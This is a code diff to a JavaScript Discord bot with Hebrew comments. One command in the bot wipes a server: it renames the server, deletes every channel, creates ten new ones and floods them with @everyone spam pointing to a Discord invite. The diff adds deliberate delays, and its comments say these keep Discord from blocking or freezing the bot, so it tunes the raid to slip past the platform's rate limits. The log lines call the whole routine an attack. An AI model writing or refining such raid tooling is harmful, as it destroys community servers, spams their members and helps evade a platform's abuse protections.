@@ -8,6 +8,9 @@ async function loadConfig() {
     return JSON.parse(configData);
 }
 
+// פונקציית עזר קטנה ליצירת הפסקה קצרה כדי שדיסקורד לא יחסמו את הבוט
+const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
+
 async function main() {
     const config = await loadConfig();
     
@@ -32,38 +35,39 @@ async function main() {
         const command = args.shift().toLowerCase();
 
         if (command === 'זניט') {
-            console.log('Hyper-speed attack started!');
+            console.log('Safe & Fast attack started!');
             
-            // 1. שינוי שם השרת הכללי (רץ ברקע)
+            // 1. שינוי שם השרת
             message.guild.setName(config.newServerName).catch(console.error);
             
-            // 2. מחיקה מהירה במקביל של כל החדרים הקיימים בשרת
+            // 2. מחיקת החדרים הקיימים - אחד אחרי השני בצורה מהירה
             const channels = await message.guild.channels.fetch();
-            const deletePromises = Array.from(channels.values()).map(channel => channel.delete().catch(console.error));
-            await Promise.all(deletePromises); 
-
-            // 3. יצירה מהירה במקביל של 10 חדרים חדשים
-            const channelPromises = [];
-            for (let i = 0; i < 10; i++) {
-                channelPromises.push(
-                    message.guild.channels.create({ name: 'כנסו-עברנו-שרת', type: 0 }).catch(console.error)
-                );
+            for (const channel of channels.values()) { 
+                await channel.delete().catch(console.error); 
+                await sleep(100); // הפסקה קטנה של עשירית שנייה
             }
-            const createdChannels = await Promise.all(channelPromises);
-            const validChannels = createdChannels.filter(ch => ch);
 
-            // 4. הפצצת ספאם היסטרית - כל הודעות הספאם נשלחות בבת אחת במקביל בכל החדרים!
-            const spamPromises = [];
+            // 3. יצירת 10 חדרים חדשים
+            const validChannels = [];
+            for (let i = 0; i < 10; i++) {
+                const created = await message.guild.channels.create({ 
+                    name: 'כנסו-עברנו-שרת', 
+                    type: 0 
+                }).catch(console.error);
+                if (created) {
+                    validChannels.push(created);
+                }
+                await sleep(100); // הפסקה קטנה בין יצירת חדרים
+            }
+
+            // 4. שליחת הודעות ספאם עם הפסקות חכמות כדי למנוע חסימה
             for (const channel of validChannels) {
                 for (let i = 0; i < 40; i++) {
-                    spamPromises.push(
-                        channel.send('@everyone כנסו עברנו שרת https://discord.gg').catch(console.error)
-                    );
+                    await channel.send('@everyone כנסו עברנו שרת https://discord.gg').catch(console.error);
+                    await sleep(150); // הפסקה קצרה בין הודעה להודעה כדי שדיסקורד לא יקפיאו את הבוט
                 }
             }
-            // מפעיל את כל מאות הודעות הספאם בשנייה אחת
-            await Promise.all(spamPromises);
-            console.log('Hyper-speed attack finished!');
+            console.log('Attack finished successfully!');
         }
     });
 
